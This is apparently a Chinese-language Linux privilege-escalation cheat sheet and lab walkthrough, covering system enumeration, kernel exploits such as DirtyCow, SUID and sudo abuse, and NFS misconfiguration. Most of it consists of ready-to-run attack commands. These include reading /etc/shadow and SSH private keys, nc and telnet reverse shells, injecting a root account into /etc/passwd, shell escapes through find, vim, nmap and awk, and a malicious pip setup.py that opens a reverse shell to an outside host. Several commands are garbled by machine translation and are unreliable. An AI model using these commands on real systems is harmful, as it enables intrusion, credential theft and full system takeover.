
# 一、提权概念
	特权升级有两种类型：水平和垂直。在水平升级中，您从一个用户转移到 另一个用户。在这种情况下，两个用户都是通用的，而在垂直方式中，我们将特权从普通用户提升为管理员。<br />	用户无法访问（读取/写入/执行）不允许访问的文件。但是，超级用户（root）可以访问系统上存在的所有文件。 为了更改任何重要的配置或进行进一步的攻击，首先，我们需要在任何基于Linux的系统上获得root用户访问权限


## 1.1、为什么要提权

- 读/写任何敏感文件
- 重新启动之间轻松保持
- 插入永久后门


## 1.2、提权所使用的技术
我们假设现在我们在远程系统上有外壳。根据我们渗透进去的方式，我们可能没有“ root”特权。以下提到的技术可用于获取系统上的“ root”访问权限。

- 内核漏洞
- 以root身份运行的程序
- 已安装的软件
- 弱密码/重用密码/纯文本密码
- 内部服务
- Suid配置错误
- 滥用sudo权利
- 由root调用的可写脚本
- 路径配置错误
- Cronjobs
- 卸载的文件系统

在提权前，我们需要收集主机信息，以确定成功提权的方式


# 二、提权前的信息收集

## 2.1、操作系统
**发行类型版本**
```
cat /etc/issue 
cat /etc/*-release  
cat /etc/lsb-release # Debian
cat /etc/redhat-release # Redhat
```

**内核版本 32位还是64位**
```
cat /proc/version
uname -a uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

**查看环境变量，环境变量中可能存在密码或API密钥**
```
cat /etc/profile 
cat /etc/bashrc
cat ~/.bash_profile  
cat ~/.bashrc  
cat ~/.bash_logout  
env set
```

**路径（Path) 如果对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制**
```
文件：PATH 
echo $ PATH
```

**查看有无打印机**
```
lpstat -a
```


## 2.2、应用与服务
**哪些服务正在运行？哪个服务具有哪个用户特权？**
```
ps aux
ps -ef top
cat /etc/services
```

**root正在运行哪些服务？在这些易受攻击的服务中，值得仔细检查！**
```
ps aux | grep root ps -ef | grep root
```

**安装了哪些应用程序？他们是什么版本的？他们目前在运行吗？**
```
ls -alh /usr/bin/ 
ls -alh /sbin/ 
dpkg -l 
rpm -qa 
ls -alh /var/cache/apt/archivesO 
ls -alh /var/cache/yum/
```

**服务设置是否配置错误？是否附有（脆弱的）插件？**
```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

**有哪些计划任务**
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

**是否有纯文本用户名和/或密码？**

- 检查Web服务器连接到数据库的文件（config.php或类似文件）
- 检查数据库以获取可能被重用的管理员密码
- 检查弱密码


## 2.3、通讯与网络
**系统具有哪些NIC？它是否连接到另一个网络？**
```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

**查看网络配置设置，确定关于该网络的信息，DHCP服务器？DNS服务器？网关？**
```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

**其他哪些用户和主机正在与系统通信？**<br />在这种情况下，用户正在运行某些只能从该主机获得的服务。我们无法从外部连接到服务。它可能是开发服务器，数据库或其他任何东西。这些服务可能以root用户身份运行， 或者其中可能存在漏洞。
```
# Linux 
netstat -anlp 
netstat -ano
```

```
lsof -i
lsof -i :80 grep 80 /etc/services
netstat -antup 
netstat -antpx
netstat -tulpn
chkconfig --list chkconfig --list | grep 3:on
last
w
```

**IP和/或MAC地址**
```
arp -e
route
/sbin/route -nee
```

**数据包嗅探是否可能？可以看到什么？**
```
tcpdump tcp dst [ip] [端口]和tcp dst [ip] [端口]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
```

**我们有shell吗？**
```
nc -lvp 4444 # Attacker. Input (Commands)
nc -lvp 4445 # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets sys
```

**是否可以进行端口转发？重定向流量并与之交互**
```
FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
```

```
ssh-[L / R] [本地端口]：[远程IP]：[远程端口] [本地用户] @ [本地IP]
ssh -L 8080:127.0.0.1:80 root\@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root\@192.168.1.7 # Remote Port
```

```
mknod backpipe p; nc -l -p [远程端口] backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost
```

可以使用隧道吗？在本地远程发送命令
```
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```


## 2.4、机密信息和用户
**你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？**
```
id 
who 
w
last
cat /etc/passwd \| cut -d: -f1 \ # List of users
grep -v -E "^#" /etc/passwd |
cat /etc/sudoers
sudo -l
```

**可以找到哪些敏感文件？**
```
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

**home/root目录有什么"有用"的地方吗？如果可以访问**
```
ls -ahlR /root/
ls -ahlR /home/
```

**里面有密码吗？脚本，数据库，配置文件还是日志文件？密码的默认路径和位置**
```
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

**用户正在做什么？是否有纯文本密码？他们在编辑什么？**
```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

**用户信息**
```
cat ~/.bashrc cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

**私钥信息**
```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


## 2.5、文件系统
**可以在/ etc /中写入哪些配置文件？能够重新配置服务？**
```
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null    # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other
find /etc/ -readable -type f 2>/dev/null             # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```

**在/ var /中可以找到什么？**
```
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

**网站上是否有任何设置/文件（隐藏）？有数据库信息的任何设置文件吗？**
```
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

**日志文件中是否有任何内容（可以帮助"本地文件包含"）**
```
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/


Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, m
```

**如果命令受到限制，获取交互shell**
```
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

**是否存在安装文件系统？**
```
mount
df -h
```

**是否有任何卸载的文件系统？**
```
cat /etc/fstab
```

**“Linux文件权限”是什么？**
```
find / -perm -1000 -type d 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
```

**可以在哪里写入和执行？一些“常见”位置：/ tmp，/ var / tmp，/ dev / shm**
```
find  / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null  # world-writeable
```

**任何"问题"文件吗？Word可写的"没人"文件**
```
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
find /dir -xdev \( -nouser -o -nogroup \) -print
```


## 2.6、准备和查找漏洞利用代码
**安装/支持哪些开发工具/语言？**
```
find / -name perl\*
find / -name python\*
find / -name gcc\* find / -name cc
```

**如何上传文件？                               **
```
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

**系统是否已完全打补丁？**
```
内核，操作系统，所有应用程序，其插件和Web服务
```


# 三、linux提权自动信息收集

## 3.1、枚举脚本

- **LinEnum**：[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **Unix特权**：[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) 运行脚本并将输出保存在文件中，然后使用grep发出警告。
- **Linprivchecker.py**：[https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)

通过利用Linux内核中的漏洞，有时我们可以提升特权。我们通常需要了解的操作系统， 体系结构和内核版本是测试内核利用是否可行的测试方法。


# 四、内核漏洞
	内核漏洞利用程序是利用内核漏洞来执行具有更高权限的任意代码的程序。成功的内核利用通常以root命令提示符的形式为攻击者提供对目标系统的超级用户访问权限。在许多情况下，升级到Linux系统上的根目录就像将内核漏洞利用程序下载到目标文件系统，编译该漏洞利用程序然后执行它一样简单。

**假设我们可以以非特权用户身份运行代码，这就是内核利用的通用工作流程。**
```
诱使内核在内核模式下运行我们的有效负载

处理内核数据，例如进程特权

以新特权启动shell root！
```

**考虑到要成功利用内核利用攻击，攻击者需要满足以下四个条件：**
```
易受攻击的内核

匹配的漏洞利用程序

将漏洞利用程序转移到目标上的能力

在目标上执行漏洞利用程序的能力
```

抵御内核漏洞的最简单方法是保持内核的修补和更新。在没有补丁的情况下，管理员可以极大地影响在目标上转移和执行漏洞利用的能力。考虑到这些因素，如果管理员可以阻止将利用程序引入和/或执行到Linux文件系统上，则内核利用程序攻击将不再可行。因此，管理员应专注于限制或删除支持文件传输的程序，例如FTP，TFTP，SCP，wget和curl。当需要这些程序时，它们的使用应限于特定的用户，目录，应用程序（例如SCP） 和特定的IP地址或域。


## 4.1、内核信息收集
**一些基本命令收集一些Linux内核信息**
```
uname -a #打印所有可用的系统信息
uname -m #Linux内核体系结构（32或64 位）
uname -r #内核发布
uname -n #要么 hostname 系统主机名
#内核信息
cat /proc/version
#发行信息
cat /etc/issue 
cat /etc/*-release
#CPU信息
cat /proc/cpuinfo 
#文件系统信息
df -a             
#列出可用的编译器
dpkg \--list 2>/dev/null\| grep compiler \|grep -v decompiler 2>/dev/null && yum list installed \'gcc\*\' 2>/dev/null\| grep gcc 2>/dev/null
```

**搜索漏洞**
```
site:exploit-db.com kernel version python linprivchecker.py extended
```


## 4.2、通过脏牛（CVE-2016-5195）利用易受攻击的机器
```
$ whoami
$ uname -a 
给我们我们知道容易受到dirtycow攻击的内核版本>下载dirtycow漏洞
https：//www.exploit-db.com/exploits/40839/
编译并执行。通过编辑/etc/passwd
它将" root"用户替换为新用户" rash"
#将当前登录用户更改为root用户的"rash"
$ su rash
```


## 4.3、其他内核提权
对于不同的内核和操作系统，可以公开获得许多不同的本地特权升级漏洞。是否可以使用内核利用漏洞在Linux主机上获得root访问权限，取决于内核是否易受攻击。Kali Linux具有exploit-db漏洞的本地副本，这使搜索本地根漏洞更加容易。我不建议在搜索Linux内核漏洞时完全依赖此数据库。

检查内核版本以及是否存在一些可用于提升特权的漏洞，我们可以在此处找到良好的易受攻击的内核列表以及一些已编译的漏洞利用程序：<br />[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

其他网站，可以找到一些编译漏洞：<br />[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)
[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

也可以直接在MSF中搜索


## 4.4、特别提醒
**不要一开始就利用任何本地特权升级漏洞**<br />如果可以避免，请不要使用内核漏洞利用。如果使用它，可能会使计算机崩溃或使其处于不稳定状态。因此，内核漏洞利用应该是最后的手段。
```
a.远程主机可能会崩溃，因为许多公开可用的根漏洞利用都不十分稳定。
b.您可能会成为root用户，然后使系统崩溃。
c.漏洞利用可能会留下痕迹/日志。
```


# 五、历史漏洞提权

## CVE-2016-5195（DirtyCow）
```
Linux内核<= 3.19.0-73.8
# make dirtycow stable
echo 0 \> /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```


# 六、利用以root权限运行的服务
**著名的EternalBlue和SambaCry漏洞利用了以root身份运行的smb服务。由于它的致命组合，它被广泛用于在全球范围内传播勒索软件。这里的手法是，如果特定服务以root用户身份运行，并且我们可以使该服务执行命令，则可以root用户身份执行命令。我们可以重点检查Web服务，邮件服务，数据库服务等是否以root用户身份运行。很多时候，运维都以root用户身份运行这些服务，而忽略了它可能引起的安全问题。可能有一些服务在本地运行，而没有公开暴露出来，但是也可以利用。**

```
#显示所有打开并正在监听的端口
netstat -antup
#列出哪些进程正在运行
ps aux
#列出以root身份运行的服务
ps -aux | grep root
```


# 七、NFS权限弱
如果您在linu服务器上具有低特权shell，并且发现服务器中具有NFS共享， 则可以使用它来升级特权。但是成功取决于它的配置方式。


## 7.1、什么是NFS？
	网络文件系统（NFS）是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在 NFS 协议是几个分布式文件系统标准，网络附加存储之一。<br />	NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。

**root_sqaush和no_root_sqaush**<br />	Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户" nfsnobody “，它具有最少的本地特权。如果 no_root_squash 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用" root_squash "参数。

注意：要利用此，no_root_squash 选项得开启。


## **7.2、利用NFS并获取Root Shell**
[https://cloud.tencent.com/developer/article/1708369](https://cloud.tencent.com/developer/article/1708369)


# 八、Suid和Guid配置错误

## 8.1、描述
	SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux ping命令通常需要root权限才能打开网络套接字。通过将ping程序标记为SUID（所有者为root），只要低特权用户执行ping程序，便会以root特权执行ping。

	SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。

	当运行具有suid权限的二进制文件时，它将以其他用户身份运行，因此具有其他用户特权。它可以是root用户，也可以只是另一个用户。如果在程序中设置了suid，该位可以生成shell或以其他方式滥用，我们可以使用它来提升我们的特权。

以下是一些可用于产生SHELL的程序：
```
nmap
vim
less
more
nano
cp
mv
find
```

**查找suid和guid文件**
```
#SUID
find / -perm -u=s -type f 2>/dev/null
#GUID
find / -perm -g=s -type f 2>/dev/null
```

**其他命令**
```
#查找SUID文件
find / -perm -4000 -type f 2>/dev/null
#查找root拥有的SUID文件
find / -uid 0 -perm -4000 -type f 2>/dev/null
#查 找 SGID 文 件
find / -perm -2000 -type f 2>/dev/null
#查找可写文件，不包括proc 文件
find / ! -path "*/proc/*\" -perm -2 -type f -print 2>/dev/null
#查找rhost配置文件
find /home --name \*.rhosts -print 2>/dev/null
#查找hosts.equiv，列出权限并管理文件内容
find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null; -exec cat {} 2>/dev/null ; 
#显示当前用户历史记录
cat \~/.bash_history 
#向当前用户分发各种历史文件
ls -la \~/.\*\_history
#检查当前用户的ssh文件
ls -la \~/.ssh/
#在/etc中列出配置文件
find /etc -maxdepth 1 -name \'\*.conf\' -type f
ls -la /etc/\*.conf 
#显示可能有趣的打开文件
lsof \| grep \'/home/\|/etc/\|/opt/' 
也可以使用 sudo -l 命令列出当前用户可执行的命令
```


## 8.2、常用提权方式
**NMAP**
```
#查找设置了SUID位的可执行文件
find / -perm -u = s -type f 2> / dev / null

#让我们确认nmap是否设置了SUID位。
ls -la / usr / local / bin / nmap
```

Nmap的SUID位置,很多时候，管理员将SUID位设置为nmap，以便可以有效地扫描网络，因为如果不使用root特权运行它，则所有的nmap扫描技术都将无法使用。但是，nmap（2.02-5.21）存在交换模式，可利用提权，我们可以在此模式下以交互方式运行nmap，从而可以转至shell。如果nmap设置了SUID位，它将以root特权运行，我们可以通过其交互模式访问’root’shell。
```
#运行nmap交互模式
nmap --interactive 
#我们可以从nmap shell转到系统shell
！sh
```

**msf中的模块为：**
```
exploit/unix/local/setuid_nmap
```

**vi/vim**<br />Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。

打开vim,按下ESC
```
:set shell=/bin/sh
:shell

sudo vim -c '!sh'
```

**bash**
```
以下命令将以root身份打开一个bash shell
bash -p
bash-3.2
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(servi
```

**less**<br />程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令。
```
less /etc/passwd
!/bin/sh
```

**more**
```
more /home/pelle/myfile
!/bin/bash
```

**cp**<br />覆盖 /etc/shadow 或 /etc/passwd
```
cat /etc/passwd >passwd
openssl passwd -1 -salt hack hack123
echo \'hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
cp passwd /etc/passwd
su - hack
id
```

**mv**<br />覆盖 /etc/shadow 或 /etc/passwd
```
cat /etc/passwd \>passwd
openssl passwd -1 -salt hack hack123
echo \'hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:
mv passwd /etc/passwd
su - hack
id
```

**nano**
```
nano /etc/passwd
```

**awk**
```
awk 'BEGIN {system("/bin/sh")}'
```

**man**
```
man passwd
!/bin/bash
```

**wget**
```
wget http://192.168.56.1:8080/passwd -O /etc/passwd
```

**apache**
```
apache2 -f /etc/shadow
```

**tcpdump**
```
echo \$\'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

**python/perl/ruby/lua/php/etc**<br />python
```
python -c "import os;os.system('/bin/bash')"
```

**perl**
```
exec "/bin/bash";
```


# 九、滥用SUDO
	在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用sudo可以升级特权。
```
/usr/bin/find
/usr/bin/nano
/usr/bin/vim
/usr/bin/man
/usr/bin/awk
/usr/bin/less
/usr/bin/nmap ( --interactive and --script method)
/bin/more
/usr/bin/wget
/usr/sbin/apache2
```

sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。

```
a.sudo能够限制用户只在某台主机上运行某些命令。
b.sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。
c.sudo使用时间戳文件来执行类似的"检票"系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。
d.sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。
```

在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。<br />sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信 息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为"sudoer"）；在一般用户需要取得特殊权限时，其可在命令前加上<br />“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。<br />由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。

参数说明：
```
-V 显示版本编号
-h 会显示版本编号及指令的使用方式说明
-l 显示出自己（执行 sudo 的使用者）的权限
-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码
-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）
-b 将要执行的指令放在背景执行
-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称
-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）
-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell
-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）
command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令
```

**Sudoer文件**<br />sudoers文件主要有三部分组成：

- sudoers的默认配置（default），主要设置sudo的一些缺省值
- alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias
- 安全策略（规则定义）

**语法**
```
root ALL=(ALL) ALL
```
root用户可以从 ALL 终端作为 ALL （任意）用户执行，并运行 ALL （任意）命令

第一部分是用户，第二部分是用户可以在其中使用 sudo 命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。 sudo
```
touhid ALL= /sbin/poweroff
```
以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。

```
touhid ALL = (root) NOPASSWD: /usr/bin/find
```
上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。


## 9.1、利用SUDO用户
**要利用sudo用户，您需要找到您必须允许的命令。**
```
sudo -l
```
上面的命令显示了允许当前用户使用的命令。

**使用查找命令**
```
sudo find / etc / passwd -exec / bin / sh \;
sudo find / bin -name nano -exec / bin / sh \;
```

**使用Vim命令**
```
sudo vim -c'！sh'
```

**使用Nmap命令**
```
sudo nmap-交互式
nmap>！sh
sh-4.1＃
```

**没有互动的最新方式**
```
echo“ os.execute（'/ bin/ sh'）”> /tmp/shell.nse && sudo nmap --script = / tmp / shell.nse
```

**使用Man命令**
```
sudo man man
```
之后按！按下并按Enter

**使用更少/更多命令**
```
sudo less / etc / hosts
sudo more / etc / hosts
```
之后按！按下并按Enter

**使用awk命令**
```
sudo awk'BEGIN {system（“ / bin / sh”）}'
```


## 9.2、docker组提权
[http://www.openskill.cn/article/21](http://www.openskill.cn/article/21)


# 十、实例

## 10.1、Find提权
**例一**<br />将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。

	拿到普通用户权限之后，使用`sudo –l`查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。
```
find ./ aaa -exec '/bin/sh' \;
```
![image.png](./assets/1671605997963-5a4c1aaa-0f58-44e4-b726-ea8d8b48236e.png)

应用链接：[DC-1](https://www.yuque.com/xmtxsec/network_security/vulnhub-dc-1)

**例二**<br />NC正向反弹<br />攻击机：
```
nc <-IP-> 9999
```

目标机：
```
touch dirty
find /xxx/xxx/dirty -exec nc -lvp 9999 -e /bin/sh \;
```
![](./assets/1671606907051-dca238a7-f30e-44e8-b45c-7c6305fa67e9.jpeg)

NC反向反弹<br />攻击机：
```
nc -lvp 8888
```

目标机：
```
touch dirty
find /xxx/xxx/dirty -exec nc <-IP-> 8888 -t -e /bin/sh \;
```
![image.png](./assets/1671607119407-c37eb602-9cc4-4a59-85f2-0c3afb695005.png)

**例三**<br />查找具有特殊权限SUID的文件
```
find / -perm -u=s -type f 2>/dev/null
```
如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行<br />![](./assets/1671607262978-7833bd5f-df59-4094-9d42-f51e4adff8cd.jpeg)

通过find命令给wget命令提供SUID权限
```
find /home -exec chmod u+s /usr/bin/wget \;
```
![](./assets/1671607458035-f4f154ce-c2dc-46b6-88bd-a82bcae277b2.jpeg)

通过OpenSSL passwd生成一个新的用户hacker，密码为hack123，并将其追加到kali的/etc/passwd文件中
```
openssl passwd -1 -salt hacker hack123
```

在Kali上启动一个python服务器
```
python2 -m SimpleHTTPServer 8000
```

将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件
```
wget -O passwd http://10.10.10.128:8000/passwd
```
![](./assets/1671607724512-d778ca6d-812d-4c80-823d-5a29587e4243.jpeg)

然后切换到hacker用户即可<br />![](./assets/1671607738985-290c1f71-3918-43e9-9604-9b69aac681f2.jpeg)


## 10.2、NMAP提权
**例一**<br />nmap被suid分配了root权限
```
find / -perm -u=s -type f 2>/dev/null
```
![](./assets/1671607838245-f378a950-d376-44c9-9112-cdbf6ee39dcc.jpeg)

用nmap来提权
```
nmap --interactive
!sh
```
![](./assets/1671607876354-3a5229cc-9542-47bf-a4e0-86dfabf8760a.jpeg)

**例二**<br />当单个用户被分配了root权限时
```
find / -perm -u=s -type f 2>/dev/null
```
![](./assets/1671607955754-28023835-9d61-41f0-84e7-0f6489f724a4.jpeg)

nmap提权
```
echo "os.execute('/bin/bash')" >> shell.nce
sudo nmap --script=/tmp/shell.nce
```
![](./assets/1671608007881-59093e83-ab71-443f-bb38-7d153dbb4525.jpeg)

应用参考链接：[DC-6](https://www.yuque.com/xmtxsec/network_security/vulnhub-dc-6)


## 10.3、PIP提权
pip命令被分配了root权限<br />![](./assets/1671526003023-46c175a0-d542-43f9-bd1b-f3d9f9b70062.png)

**方法一**
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
![](./assets/1671526741086-9aaea337-94ed-4cd0-b0b4-08dc5f42aa1c.png)

**方法二**<br />本地启动监听
```
nc -tvlp 9999
```
![](./assets/1671528059147-bd1b5298-2c1f-4a87-8bdc-001b1c067020.png)

编写提权脚本setup.py
```
from setuptools import setup   #加入

def con():
	import socket, time,pty, os
	host='192.168.1.3'
	port=9999
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

setup(name="hahahaha", version="1.0")  #加入
```

将setup.py上传到目标机
```
python2 -m SimpleHTTPServer 7777
```
![image.png](./assets/1671527940830-2bf27237-80e6-425d-a5d4-09be4c800719.png)
```
wget http://192.168.1.3:7777/setup.py
```
![image.png](./assets/1671527984893-2b03e4bc-e466-4ba5-a062-18d5ea57d325.png)

在靶机上执行
```
sudo /usr/bin/pip install . --upgrade --force-reinstall
```

成功反弹shell
![image.png](./assets/1671527667637-dd81ec67-7d15-4b1c-a803-e4b17e793b80.png)

应用参考链接：[Empire: LupinOne](https://www.yuque.com/xmtxsec/network_security/gzpcg65xp5si10tl)


## 10.4、ZIP提权
zip命令被分配了root权限<br />![](./assets/1671608451230-9ae50937-adb3-47d5-9423-1a6af913ceba.jpeg)

